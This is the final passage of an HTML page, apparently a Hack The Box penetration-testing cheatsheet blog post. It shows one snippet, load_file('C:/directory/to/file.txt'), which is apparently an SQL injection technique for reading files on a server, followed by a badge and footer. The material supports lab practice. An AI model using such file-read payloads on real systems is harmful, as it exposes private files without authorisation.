</code></pre></div></div> <p>Loading a file:</p> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load_file<span class="o">(</span><span class="s1">'C:/directory/to/file.txt'</span><span class="o">)</span>
</code></pre></div></div> <p><img src="https://www.hackthebox.eu/badge/image/192313" alt="HTB-Profile" title="HTB-Profile" /></p> <aside class="share"> <span>Share this: </span> <a href="http://twitter.com/share?text=HTB Cheatsheet&amp;url=http://retostaehli.github.io/htb-cheatsheet/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;"> <i class="fa fa-twitter-square"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?u=http://retostaehli.github.io/htb-cheatsheet/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;"> <i class="fa fa-facebook-square"></i> </a> </aside> </div> </article> <footer class="footer t-center"> <div class="container"> <div class="social-icons"> <ul class="text-left"> <li><a href="http://github.com/retostaehli" target="_blank"><i class="fa fa-github"></i></a></li> <li><a href="https://www.linkedin.com/in/reto-st%C3%A4hli-0a2426199" target="_blank"><i class="fa fa-linkedin"></i></a></li> </ul> </div> <small>&copy; 2020 All rights reserved.</small> </div> </footer> </main> </body> </html></body></html>
